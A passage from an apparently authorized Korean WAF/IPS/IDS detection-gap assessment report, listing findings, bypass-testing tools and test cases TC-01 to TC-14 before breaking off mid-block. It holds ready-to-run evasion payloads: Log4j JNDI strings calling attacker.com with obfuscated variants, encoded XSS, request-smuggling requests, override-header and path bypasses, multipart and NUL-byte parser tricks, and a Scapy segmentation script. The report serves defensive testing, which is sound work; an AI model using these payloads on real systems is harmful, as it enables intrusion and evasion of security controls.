| JNDI body | **timeout (차단)** | **302 (통과)** | **302 (통과)** |
| JNDI header (대조군) | **timeout (차단)** | - | - |

IPS는 body를 검사하고 있으나(비압축 JNDI → timeout), 압축하면 동일 payload가 통과한다. header 기반 탐지는 정상 동작(대조군). 대부분의 IPS/WAF에 body decompression 설정이 존재하므로(Snort `decompress_gzip`, Suricata `decompression.enabled`, Palo Alto/Fortinet Inspect Compressed Content), 해당 설정 활성화 확인이 필요하다.

#### 발견 2: Content-Type 무관하게 IPS body 검사 확인 (TC-09, 긍정)

같은 JNDI body를 6종의 Content-Type(`application/json`, `text/plain`, `application/xml`, `application/octet-stream`, `multipart/form-data`, CT 없음)으로 IPS-visible HTTP 경로에서 전송한 결과, **전부 timeout(차단)**. IPS는 Content-Type과 무관하게 body 전체를 검사하고 있음이 확인되었다.

#### 발견 3: IPS TCP 재조합 정상 동작 (TC-08, 긍정)

HTTP 요청을 2바이트 단위로 TCP 분할하여 전송해도 IPS가 올바르게 재조합하여 정상 302 응답을 반환했다. JNDI 공격 문자열을 세그먼트 경계에 걸쳐 분할 전송하면 IPS가 재조합 후 탐지하여 408로 차단했다.

#### 발견 4: JNDI Lookup 변형 광범위 탐지 (TC-03, 긍정)

`${jndi:ldap://...}`, `${jndi:rmi://...}`, `${jndi:dns://...}`, 중첩 우회(`${j${::-n}di:...}`) 패턴 모두 IPS-visible HTTP 경로에서 timeout(탐지). Service-A 점검에서 확인된 `${` 기반 1차 인라인 차단과 동일한 패턴이다.

#### 발견 5: 라우팅 헤더 미필터링, 비표준 JSON 허용, CT 미검증

앱 API(`service-b-appif:27000`, HTTPS)에서 다음이 확인되었다. 다만 HTTPS 경로이므로 IPS 판정이 아닌 앱 서버 동작으로 해석한다.

- `X-Forwarded-Host`, `X-Original-URL`, `Forwarded` 등 라우팅 헤더가 앱까지 전달되어 정상 처리됨 (TC-19)
- JSON 중복 키가 앱에서 정상 처리(0000). 비표준 JSON 문법(작은따옴표, NaN)도 일부 수용 (TC-15, TC-22)
- `application/json` 외의 Content-Type으로 보내도 앱이 JSON body를 동일하게 파싱 (TC-09, TC-11)
- HTTP obsolete line folding, Transfer-Encoding tab prefix가 서버에서 수용됨 (TC-07)

#### 발견 6: HTTP/2 다운그레이드 차이 없음 (TC-16, 긍정)

동일 요청을 HTTP/2와 HTTP/1.1로 보냈을 때 응답이 동일. 프로토콜 다운그레이드를 통한 보안 우회 경로 없음.

---

## **5. 점검 도구 (Testing Tools)**

본 보고서의 점검 시나리오(TC-01~TC-26)를 자동화한 재현 스킬은 아래 저장소에서 관리한다:

> **[windshock/waf-ips-ids-retest](https://github.com/windshock/waf-ips-ids-retest)** — WAF/IPS/IDS 탐지 공백 재검증 자동화 스킬. target-profile.yaml과 run-config.yaml을 설정하면 대상 환경에 맞춰 TC를 실행하고, 증적(CSV/JSON)과 보고서를 자동 생성한다. IPS 가시성 구간 판별, 4-cell 검증 매트릭스, 응답 출처 분류를 내장하고 있다.

아래 오픈소스 도구는 각 구조적 공백 유형에 대응하는 자동화 점검을 수행할 수 있다. 모든 도구는 사전 승인된 대상에 한해 사용한다.

| 도구 | 저장소 | 대상 공백 유형 | 핵심 기능 |
| :---- | :---- | :---- | :---- |
| **WAFFLED** | [sa-akhavani/waffled](https://github.com/sa-akhavani/waffled) | 검사 모드 선택, 구조적 데이터 조작 | Grammar-based 퍼징으로 Content-Type/Boundary/Charset/Field Name 변형을 자동 생성. RFC 2231 parameter continuation, NUL byte 주입, CRLF 변형 등 1,207개 고유 우회 재현. Raw socket 기반 전송으로 HTTP 클라이언트 정규화 방지 |
| **Smuggler** | [defparam/smuggler](https://github.com/defparam/smuggler) | 프로토콜 경계 | Transfer-Encoding 헤더의 60~300+ 변형(공백, 제어 문자, 대소문자, 줄바꿈, 중복 헤더 등)을 자동 테스트. Timeout 기반 CL.TE/TE.CL 탐지. 발견된 페이로드를 `payloads/` 디렉토리에 자동 저장 |
| **Cortisol** | [toxy4ny/cortisol](https://github.com/toxy4ny/cortisol) | 인코딩·정규화 차이, 경로 정규화 | Double/Triple URL Encoding, UTF-8 Overlong Sequence(`%C0%BC`, `%E0%80%BC`, `%F0%80%80%BC`), space2comment, apostrephemask 등 탐퍼 체인 적용. Cloudflare/AWS/Sucuri/Imperva/ModSecurity/Akamai/F5/Wordfence 자동 탐지 |
| **WAF-Bypass** | [nemesida-waf/waf-bypass](https://github.com/nemesida-waf/waf-bypass) | 전체 (종합 점검) | SQLi, XSS, RCE, LFI, SSRF, SSTI, Log4j 등 18개 카테고리의 수백 개 페이로드를 7개 zone(URL, ARGS, BODY, COOKIE, USER-AGENT, REFERER, HEADER)에 자동 투입. Base64/HTML-Entity/UTF-16 인코딩 변형 지원. `--curl-replay`로 재현 명령 출력 |
| **WCD Testing Tool** | [Ap6pack/web-cache-deception-testing-tool](https://github.com/Ap6pack/web-cache-deception-testing-tool) | 중간 계층-후단 정규화 | 6개 정적 확장자(.css, .jpg, .png, .txt, .html, .ico)와 8개 delimiter(`;@,!~%#?`)를 조합하여 캐시 적중 여부 자동 확인. 인증/비인증 요청 비교로 Cross-user 노출 탐지 |
| **HTTP Request Smuggler** (Burp) | [PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler) | 프로토콜 경계 (HTTP/2 포함) | Burp Suite 확장. HTTP/1.1 CL.TE/TE.CL 외에 HTTP/2 다운그레이드(H2.CL, H2.TE, H2.0), pause-based desync, client-side desync까지 지원. Parser discrepancy 자동 탐지 (v3.0, 2025) |

### **도구 설치 및 기본 실행**

```bash
# WAFFLED (Python 3 + raw socket relay)
git clone https://github.com/sa-akhavani/waffled.git
cd waffled && pip install -r requirements.txt
# 퍼징 실행 후 http-request-relay로 raw 전송

# Smuggler
git clone https://github.com/defparam/smuggler.git
python3 smuggler/smuggler.py -u https://target.example.com/

# Cortisol (Python)
git clone https://github.com/toxy4ny/cortisol.git
python3 cortisol/cortisol.py -t https://target.example.com/search -p q -a xss

# WAF-Bypass (Docker 또는 pip)
docker run nemesida/waf-bypass --host='https://target.example.com'
# 또는
pip install git+https://github.com/nemesida-waf/waf-bypass.git
python3 -m wafw00f https://target.example.com  # WAF 식별 후
python3 main.py --host='https://target.example.com' --block-code=403 --threads=10

# Web Cache Deception
git clone https://github.com/Ap6pack/web-cache-deception-testing-tool.git
python3 cache_deception_test.py --url "https://target.example.com/my-account" \
  --cookie "session=VALID_SESSION"
```

---

## **6. 탐지 공백 점검 시나리오 (Penetration Test Cases)**

아래 시나리오는 각 구조적 공백이 실제로 존재하는지 pentester가 확인할 수 있도록 구체적인 테스트 방법을 기술한다. 모든 테스트는 사전 승인된 대상에 한해 수행한다. 각 TC에 활용 가능한 자동화 도구를 함께 기재한다.

### **TC-01. JSON Unicode Escape를 통한 Body 탐지 우회**

**대상 공백**: 인코딩·정규화 차이 / JSON 검사 파이프라인 공백  
**목적**: WAF/IDS가 JSON Body 내 유니코드 이스케이프를 디코딩하여 검사하는지 확인

**정상 요청 (탐지 예상)**:

```http
POST /api/auth/verify HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"user_id":"${jndi:ldap://attacker.com/a}"}
```

**우회 요청 (탐지 여부 확인)**:

```http
POST /api/auth/verify HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"user_id":"\u0024\u007bjndi:ldap://attacker.com/a\u007d"}
```

**curl 명령**:

```bash
# 정상 페이로드 (탐지 기준선 확인)
curl -X POST https://target.example.com/api/auth/verify \
  -H "Content-Type: application/json" \
  -d '{"user_id":"${jndi:ldap://attacker.com/a}"}'

# Unicode Escape 변형
curl -X POST https://target.example.com/api/auth/verify \
  -H "Content-Type: application/json" \
  -d '{"user_id":"\u0024\u007bjndi:ldap://attacker.com/a\u007d"}'
```

**자동화 도구 (WAF-Bypass)**:

```bash
# WAF-Bypass의 RCE 카테고리에 Log4j JNDI 페이로드 포함 (12~15.json)
# URL-encoded JNDI, nested lookup ${lower:l}${lower:d}a${lower:p} 등 자동 테스트
python3 main.py --host='https://target.example.com' \
  --block-code=403 --threads=10 --details --curl-replay

# Base64/UTF-16 인코딩 변형도 자동 적용
```

**판정 기준**:
- 정상 요청이 차단되고 우회 요청이 통과하면 → JSON 정규화 미흡 확인
- 서버 측 로그에서 `${jndi:ldap://...}` 형태로 복원·실행된 흔적이 있으면 → 실제 취약

---

### **TC-02. Double URL Encoding을 통한 경로/파라미터 탐지 우회**

**대상 공백**: 인코딩·정규화 차이  
**목적**: WAF/IDS가 다단계 URL 인코딩을 재귀적으로 디코딩하는지 확인

**테스트 요청**:

```bash
# 1단계 인코딩 (탐지 예상)
curl "https://target.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# 2단계 인코딩 (탐지 여부 확인)
curl "https://target.example.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# 혼합 인코딩 (일부만 이중 인코딩)
curl "https://target.example.com/search?q=%253Cscript%3Ealert(1)%253C/script%253E"
```

**디코딩 흐름**:
| 단계 | 값 |
| :---- | :---- |
| 원본 (2단계 인코딩) | `%253Cscript%253E` |
| WAF 1차 디코딩 | `%3Cscript%3E` (무해한 문자열로 인식) |
| 백엔드 2차 디코딩 | `<script>` (실행 가능한 태그로 복원) |

**자동화 도구 (Cortisol)**:

```bash
# Cortisol로 SQLi/XSS/LFI/SSRF의 double/triple encoding 자동 테스트
python3 cortisol.py -t https://target.example.com/search -p q -a xss
python3 cortisol.py -t https://target.example.com/page -p id -a sqli

# UTF-8 Overlong Sequence 테스트 (Zig 버전)
# < → %C0%BC (2-byte), %E0%80%BC (3-byte), %F0%80%80%BC (4-byte)
# ' → %C0%A7, " → %C0%A2
cortisol -t https://target.example.com/search -p q -a xss -T doubleurlencode
```

**추가 Overlong UTF-8 수동 테스트**:

```bash
# < 를 2-byte overlong으로 인코딩
curl "https://target.example.com/search?q=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE"

# < 를 3-byte overlong으로 인코딩
curl "https://target.example.com/search?q=%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE"
```

**판정 기준**: 1단계 인코딩은 차단되나 2단계 인코딩 또는 Overlong UTF-8이 통과하면 → 재귀 디코딩/비표준 문자 처리 미적용

---

### **TC-03. Log4j Nested Lookup 변형을 통한 시그니처 우회**

**대상 공백**: 애플리케이션 내부 치환 / Lookup 처리  
**목적**: 고정 키워드(`jndi:ldap`) 외의 Lookup 변형에 대한 탐지 여부 확인

**테스트 페이로드 세트** (Header 또는 Body의 임의 필드에 삽입):

```
# Case Variation
${JnDi:lDaP://attacker.com/a}

# lower/upper 함수 중첩
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# Default Value 구문으로 문자열 분할
${j${::-n}di:ldap://attacker.com/a}
${jndi:ldap${::-:}//attacker.com/a}

# 환경변수 Lookup 중첩
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

# Recursive Lookup (다단계)
${${lower:${lower:jndi}}:${lower:ldap}://attacker.com/a}
```

**curl 명령 (User-Agent 헤더 삽입 예시)**:

```bash
# 기본 탐지 기준선
curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' \
  https://target.example.com/

# Default Value 분할
curl -H 'User-Agent: ${j${::-n}di:ldap://attacker.com/a}' \
  https://target.example.com/

# lower 함수 중첩
curl -H 'User-Agent: ${${lower:j}ndi:${lower:l}dap://attacker.com/a}' \
  https://target.example.com/
```

**WAF-Bypass Log4j 페이로드 (자동화)**:

```bash
# WAF-Bypass RCE 카테고리의 Log4j 전용 페이로드:
# 15.json: ${jndi:${lower:l}${lower:d}a${lower:p}://ex${upper:a}mple.com}
#   → URL-encoded: %24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com
# 12.json: ${jndi:dns://example.com/}
# 13.json: URL-encoded JNDI

# 7개 zone(URL, ARGS, BODY, COOKIE, USER-AGENT, REFERER, HEADER)에 자동 투입
python3 main.py --host='https://target.example.com' --block-code=403 --curl-replay
```

**판정 기준**:
- 기본 페이로드만 차단되고 변형이 통과하면 → 고정 키워드 기반 룰 한계 확인
- `${...}` 구조 자체를 탐지하지 못하면 → Generic Pattern 미적용

---

### **TC-04. HTTP Parameter Pollution (HPP)**

**대상 공백**: 구조적 데이터 조작  
**목적**: 파라미터 중복 시 보안 장비와 백엔드의 해석 차이 확인

**테스트 요청**:

```bash
# 동일 파라미터 중복 (GET)
curl "https://target.example.com/api/user?id=1&id=2%20OR%201=1"

# GET + POST 혼합 (파라미터 소스 혼동)
curl -X POST "https://target.example.com/api/user?id=1" \
  -d "id=2%20OR%201=1"

# 배열 표기를 이용한 파라미터 다중화
curl "https://target.example.com/api/user?id[]=1&id[]=2%20OR%201=1"
```

**서버별 예상 처리 차이**:
| 환경 | 동일 파라미터 `?id=1&id=2` 처리 결과 |
| :---- | :---- |
| ASP.NET | `id=1,2` (결합) |
| PHP/Apache | `id=2` (마지막 값) |
| JSP/Tomcat | `id=1` (첫 번째 값) |
| Python Flask | `id=1` (첫 번째 값) |

**판정 기준**: WAF가 첫 번째 값(`1`)만 검사하고 백엔드가 마지막 값(`2 OR 1=1`)을 처리하면 → HPP 탐지 공백 확인

---

### **TC-05. Path 정규화 불일치를 통한 접근 통제 우회**

**대상 공백**: 의미 재해석 공백 / 경로 정규화 차이  
**목적**: 경로 변형 시 WAF 룰과 백엔드 라우팅 간 해석 차이 확인

**테스트 요청**:

```bash
# 정상 차단 확인 (관리자 경로)
curl https://target.example.com/admin/dashboard

# 인코딩된 슬래시
curl https://target.example.com/%2Fadmin%2Fdashboard

# 중복 슬래시
curl https://target.example.com//admin//dashboard

# 상대 경로 삽입
curl https://target.example.com/public/../admin/dashboard

# Dot-segment + 인코딩 혼합
curl https://target.example.com/public/..%2Fadmin%2Fdashboard

# Null byte 삽입 (레거시 서버 대상)
curl https://target.example.com/admin%00.jpg
```

**판정 기준**: 정상 경로는 차단되나 변형 경로가 통과하고, 백엔드에서 동일 리소스로 라우팅되면 → Path 정규화 공백 확인

---

### **TC-06. Override Header를 통한 URL/Method 경로 변조**

**대상 공백**: 의미 재해석 공백 (라우팅 전/후 재평가 누락)  
**목적**: 비표준 헤더를 통해 WAF가 검사한 경로/메서드와 다른 경로/메서드가 실행되는지 확인

**URL Override 테스트**:

```bash
# X-Original-URL 헤더
curl https://target.example.com/public/safe-page \
  -H "X-Original-URL: /admin/delete-user?id=1"

# X-Rewrite-URL 헤더
curl https://target.example.com/public/safe-page \
  -H "X-Rewrite-URL: /admin/delete-user?id=1"

# X-Forwarded-Prefix 헤더
curl https://target.example.com/safe-page \
  -H "X-Forwarded-Prefix: /admin"

# Next.js x-middleware-subrequest (CVE-2025-29927)
curl https://target.example.com/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware"
```

**Method Override 테스트**:

```bash
# POST로 전송하되 Method Override 헤더로 DELETE 실행 시도
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-HTTP-Method 헤더 변형
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method: PUT" \
  -d '{"role":"admin"}'

# X-Method-Override 헤더 변형
curl -X POST https://target.example.com/api/user/1 \
  -H "X-Method-Override: DELETE"
```

**판정 기준**:
- WAF가 `/public/safe-page`를 기준으로 허용하되, 서버 응답이 관리자 기능을 실행하면 → URL Override 미차단
- WAF가 POST로 판단하여 통과시켰으나 서버가 DELETE/PUT으로 실행하면 → Method Override 미차단

---

### **TC-07. HTTP Request Smuggling (HRS)**

**대상 공백**: 프로토콜 경계 공백  
**목적**: 프런트엔드(WAF)와 백엔드 간 요청 경계 해석 차이 확인

**CL.TE 공격 (Content-Length 우선 해석 서버 → Transfer-Encoding 우선 해석 서버)**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**TE.CL 공격**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**0.CL 데싱크 (James Kettle 2025)**:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.example.com

```

**자동화 도구 (Smuggler)**:

```bash
# 기본 스캔 (60+ Transfer-Encoding 변형 자동 테스트)
python3 smuggler.py -u https://target.example.com/

# Exhaustive 스캔 (300+ 변형: 대소문자, 줄바꿈, 중복 헤더, 제어 문자 등)
python3 smuggler.py -u https://target.example.com/ -c exhaustive.py

# Double-byte 조합 스캔 (2개 위치에 동시 제어 문자 삽입)
python3 smuggler.py -u https://target.example.com/ -c doubles.py

# 느린 네트워크에서 timeout 연장
python3 smuggler.py -u https://target.example.com/ -t 10 -l smuggler.log

# 발견된 페이로드는 payloads/ 디렉토리에 자동 저장
# 예: payloads/https_target_example_com_CLTE_midspace-09.txt
```

**Smuggler가 테스트하는 주요 Transfer-Encoding 변형**:

| 변형 유형 | 예시 |
| :---- | :---- |
| 선행 공백/탭 | `·Transfer-Encoding: chunked`, `Transfer-Encoding:\tchunked` |
| 제어 문자 삽입 | `Transfer-Encoding:%0Bchunked`, `Transfer-Encoding:\xFFchunked` |
| 대소문자 혼합 | `TrAnSFer-EnCODinG: cHuNkeD` |
| 줄바꿈 감싸기 | `Transfer-Encoding:\n chunked` |
| 중복 헤더 | `Transfer-Encoding: cow\r\nTransfer-Encoding: chunked` |
| 구분자 변형 | `Transfer Encoding: chunked` (공백), `Transfer_Encoding: chunked` (밑줄) |
| 값 감싸기 | `Transfer-Encoding: "chunked"`, `Transfer-Encoding: 'chunked'` |
| 접미사 추가 | `Transfer-Encoding: chunked, cow` |

**Burp Suite HTTP Request Smuggler (HTTP/2 포함)**:

```
# Burp Suite → Extensions → HTTP Request Smuggler (v3.0)
# 대상 URL에 대해 자동 스캔:
# - CL.TE, TE.CL (HTTP/1.1)
# - H2.CL, H2.TE, H2.0 (HTTP/2 다운그레이드)
# - Pause-based desync
# - Client-side desync
# - Parser discrepancy 자동 탐지
```

**판정 기준**:
- 두 번째 요청(밀수된 요청)이 별도 처리되어 다른 사용자 세션에 영향을 미치면 → HRS 취약
- `405 Method Not Allowed` 등 비정상 응답이 후속 요청에서 발생하면 → 요청 경계 불일치 의심
- Smuggler가 `payloads/` 디렉토리에 파일을 생성하면 → 해당 변형에서 데싱크 확인

---

### **TC-08. TCP Segmentation을 통한 IDS 탐지 우회**

**대상 공백**: 프로토콜 경계 공백 / 네트워크 계층 가시성  
**목적**: IDS가 분할된 TCP 세그먼트를 완전히 재조합하여 검사하는지 확인

**Scapy를 이용한 분할 전송 (Python)**:

```python
from scapy.all import *

target = "target.example.com"
target_ip = "x.x.x.x"
dport = 80

payload = (
    "GET /search?q=<script>alert(1)</script> HTTP/1.1\r\n"
    "Host: {}\r\n\r\n".format(target)
)

ip = IP(dst=target_ip)
syn = ip / TCP(dport=dport, flags="S")
syn_ack = sr1(syn)

ack = ip / TCP(dport=dport, flags="A",
               seq=syn_ack.ack, ack=syn_ack.seq + 1)
send(ack)

for i in range(0, len(payload), 2):
    segment = ip / TCP(dport=dport, flags="PA",
                       seq=syn_ack.ack + i,
                       ack=syn_ack.seq + 1) / payload[i:i+2]
    send(segment)
```
`nmap --mtu` 같은 간이 기법은 실제 애플리케이션 계층 세그먼트 재조합 검증을 대체하지 못하므로, 본 TC에서는 보조 수단으로도 채택하지 않았다.

**재테스트 보완(2026-03-11)**:

- 기존 `header split`, `body split`, `8-byte split` 외에, 실제 앱 헤더 계약(`x-app-agent`, `x-app-crypted-sid`)을 맞춘 `GET /api/app/metadata` 기준선으로 추가 검증했다.
- 동일 엔드포인트/동일 헤더 조건에서:
  - benign control은 baseline `403`, segmented도 `403`
  - plain JNDI referer는 baseline `timeout`, segmented도 서버 payload 응답 없이 hold/drop 성향 유지
  - unicode escape referer는 baseline `403`, segmented도 `403`
- `post_header_body_split` pcap에서는 첫 번째 헤더 조각만 받은 상태에서 앞단이 먼저 `HTTP/1.1 403 Forbidden`을 반환했다.

**판정 기준**:

- 정상 크기 전송 시 차단되나 분할 전송 시 통과하면 → 세션 재조합 한계 의심
- 단, benign/plain/unicode control 비교 없이 단일 segmented 요청만으로 우회로 결론내리지 않는다.
- 이번 재테스트 기준 결론은 `실제 segmentation 수행은 입증`, `segmentation 자체로 추가 우회가 발생했다는 증거는 미확보`다.

---

### **TC-09. Multipart Boundary 조작을 통한 Body 파싱 우회**

**대상 공백**: 검사 모드 선택 공백 / 구조적 데이터 조작  
**목적**: WAF가 비표준 Multipart 구조를 올바르게 파싱하는지 확인

**Boundary 중복 정의**:

```http
POST /upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

--xyz
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

<script>alert(1)</script>
--xyz--
```

**Boundary 내 공백/특수문자 삽입**:

```http
POST /upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary="abc def"

--abc def
Content-Disposition: form-data; name="payload"

${jndi:ldap://attacker.com/a}
--abc def--
```

**Content-Type 제거 (WAFFLED 기법)**:

```bash
# Content-Type 없이 JSON 전송 → WAF가 parser branch 선택 실패
curl -X POST https://target.example.com/api/data \
  --data-binary '{"q":"<script>alert(1)</script>"}' \
  -H "Content-Length: 40"

# Content-Type에 이상 charset 삽입
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json; charset=ibm037" \
  -d '{"q":"<script>alert(1)</script>"}'
```

**curl 명령**:

```bash
curl -X POST https://target.example.com/upload \
  -H 'Content-Type: multipart/form-data; boundary=abc; boundary=xyz' \
  --data-binary $'--xyz\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--xyz--'
```

**자동화 도구 (WAFFLED)**:

```bash
# WAFFLED fuzzer로 Multipart/JSON/XML 구조 변형 자동 생성
cd waffled && python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/multipart/multipart_simple \
  --output /tmp/waffled_payloads/

# RFC 2231 parameter continuation 테스트 (boundary 분할)
python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/multipart/multipart_param

# 생성된 raw 요청을 http-request-relay로 전송 (curl은 헤더를 정규화하므로 사용 불가)
cd http-request-relay && go build -o relay
./relay -target target.example.com:443 -tls -input /tmp/waffled_payloads/
```

**WAFFLED에서 발견된 추가 우회 기법**:

```bash
# NUL byte 주입 (WAF가 NUL에서 파싱 중단, 백엔드는 무시하고 계속)
# Content-Type에 NUL: multipart/form-data\x00; boundary=real
# JSON key에 NUL: {"field1\x00":"<script>alert(1)</script>"}
# Content-Disposition에 NUL: form-da\x00ta; name="field1"

# RFC 2231 boundary 분할 (WAF가 RFC 2231 미지원 시 우회)
# Content-Type: multipart/form-data; boundary*0=re;boundary*1=al
# → WAF는 boundary를 인식하지 못하고, 백엔드는 "real"로 결합

# Content-Type 헤더명 변형
# Content_-Type: multipart/form-data (밑줄 삽입)
# Cntent-Type: multipart/form-data (문자 누락)
# ContentType: application/json (하이픈 제거)

# CRLF 변형
# boundary=real\r\r\n (이중 CR)
# boundary=real;\r\n (trailing semicolon)
```

**판정 기준**:
- WAF가 첫 번째 boundary(`abc`)로 파싱하여 페이로드를 놓치고, 서버가 두 번째 boundary(`xyz`)로 실행하면 → Multipart 파싱 공백
- Content-Type 없이 전송했을 때 WAF가 검사를 생략하면 → 검사 모드 선택 공백
- NUL byte 삽입 시 WAF가 해당 지점에서 파싱을 중단하면 → NUL byte termination 취약

---

### **TC-10. 자체 암호화 구간 가시성 확인**

**대상 공백**: 암복호화 구간  
**목적**: 자체 암호화 모듈을 사용하는 구간에서 IDS/WAF의 가시성 상실 여부 확인

**테스트 방법**:

```bash
# 1. 평문 공격 페이로드 전송 → WAF 탐지 여부 확인
curl -X POST https://target.example.com/api/service \
  -H "Content-Type: application/json" \
  -d '{"cmd":"${jndi:ldap://attacker.com/a}"}'

# 2. 동일 페이로드를 대상 서비스의 자체 암호화 로직으로 감싼 뒤 전송
#    (암호화 키·알고리즘은 클라이언트 앱 리버스 엔지니어링을 통해 확보)
python3 encrypt_payload.py '{"cmd":"${jndi:ldap://attacker.com/a}"}' | \
  curl -X POST https://target.example.com/api/service \
    -H "Content-Type: application/octet-stream" \
    --data-binary @-

# 3. 서버 측 로그에서 복호화 후 실행 흔적 확인
```

**판정 기준**:
- 평문 전송 시 차단되나 암호화 전송 시 통과하면 → 암호화 구간 가시성 상실 확인
- 서버 로그에 공격 흔적이 남으면 → 서버 측 RASP/EDR 부재 확인

---

### **TC-11. Content-Type 조작을 통한 검사 모드 선택 우회 (WAFFLED)**

**대상 공백**: 검사 모드 선택 공백  
**목적**: Content-Type 변형 시 WAF가 올바른 parser branch로 진입하는지 확인

**테스트 요청**:

```bash
# 기준선: 정상 Content-Type으로 탐지 확인
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(1)</script>"}'

# Content-Type 제거
curl -X POST https://target.example.com/api/data \
  -H "Content-Length: 40" \
  --data-binary '{"q":"<script>alert(1)</script>"}'

# Content-Type 대소문자 변형
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: Application/JSON" \
  -d '{"q":"<script>alert(1)</script>"}'

# Content-Type에 추가 파라미터 삽입
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json; charset=utf-8; boundary=fake" \
  -d '{"q":"<script>alert(1)</script>"}'

# Content-Type을 text/plain으로 변경 (서버가 JSON으로 파싱할 경우)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: text/plain" \
  -d '{"q":"<script>alert(1)</script>"}'

# multipart에서 Content-Disposition field name 변형 (WAFFLED)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: multipart/form-data; boundary=x" \
  --data-binary $'--x\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--x--'
```

**자동화 도구 (WAFFLED + WAF-Bypass)**:

```bash
# WAFFLED: Content-Type 변형 + 구조 변형을 grammar-based로 자동 생성
cd waffled && python3 t-reqs-modified/code/fuzzer.py \
  --grammar fuzzer-grammar/json/json_simple \
  --output /tmp/waffled_json/

# WAF-Bypass: API/MFD 카테고리로 Content-Type 변형 테스트
# API 카테고리는 application/json으로, MFD는 multipart/form-data로 동일 페이로드 전송
python3 main.py --host='https://target.example.com' \
  --block-code=403 --details --curl-replay
```

**판정 기준**:
- 정상 Content-Type에서만 탐지되고 변형 시 통과하면 → 검사 모드 선택 공백 확인
- 서버가 Content-Type과 무관하게 JSON으로 파싱하여 실행하면 → 실제 우회 성립

---

### **TC-12. Body Oversize를 통한 검사 범위 우회**

**대상 공백**: 검사 범위 공백  
**목적**: WAF의 body inspection size limit을 초과하는 위치에 페이로드를 배치했을 때 탐지 여부 확인

**테스트 방법 (Python)**:

```python
import requests

target = "https://target.example.com/api/data"

# WAF body inspection limit 탐색 (일반적으로 8KB, 16KB, 64KB 등)
for size_kb in [8, 16, 32, 64, 128]:
    padding = "A" * (size_kb * 1024)
    payload = '{"padding":"' + padding + '","cmd":"${jndi:ldap://attacker.com/a}"}'

    resp = requests.post(target,
        headers={"Content-Type": "application/json"},
        data=payload,
        verify=False)

    print(f"[{size_kb}KB padding] Status: {resp.status_code}, "
          f"Length: {len(resp.content)}, "
          f"Blocked: {'WAF' in resp.text or resp.status_code == 403}")
```

**curl 간이 테스트**:

```bash
# 8KB 패딩 후 페이로드 배치
python3 -c "print('A'*8192)" | \
  xargs -I{} curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    -d '{"padding":"{}","cmd":"${jndi:ldap://attacker.com/a}"}'

# 대용량 JSON 배열로 검사 한도 초과 유도
python3 -c "
import json
arr = ['safe'] * 10000 + ['<script>alert(1)</script>']
print(json.dumps({'items': arr}))
" | curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    --data-binary @-
```

**판정 기준**:
- 특정 크기 이상에서 동일 페이로드가 탐지되지 않으면 → body inspection size limit 확인
- `403` → `200`으로 전환되는 크기가 WAF의 검사 한도

---

### **TC-13. HTTP Method Override를 통한 ACL 우회**

**대상 공백**: 의미 재해석 공백  
**목적**: WAF가 HTTP Method 기준으로 ACL을 적용할 때, override 헤더로 실제 실행 메서드를 변경할 수 있는지 확인

**테스트 요청**:

```bash
# 기준선: DELETE 메서드 직접 호출 (WAF 차단 예상)
curl -X DELETE https://target.example.com/api/user/1

# X-HTTP-Method-Override 헤더로 우회
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-HTTP-Method 헤더 변형
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method: DELETE"

# X-Method-Override 헤더 변형
curl -X POST https://target.example.com/api/user/1 \
  -H "X-Method-Override: DELETE"

# _method 파라미터 (일부 프레임워크 지원)
curl -X POST https://target.example.com/api/user/1 \
  -d "_method=DELETE"

# PUT으로 권한 상승 시도
curl -X POST https://target.example.com/api/user/1 \
  -H "X-HTTP-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**판정 기준**:
- DELETE가 직접 차단되나 POST + Override 헤더로 삭제가 실행되면 → Method Override 미차단
- PUT으로 권한 변경이 성공하면 → ACL 우회 확인

---

### **TC-14. Web Cache Deception (CDN/캐시-오리진 정규화 차이)**

**대상 공백**: 중간 계층-후단 정규화 공백  
**목적**: CDN/캐시와 오리진 서버가 경로를 다르게 해석하여 동적 응답이 캐시되는지 확인

**테스트 요청**:

```bash
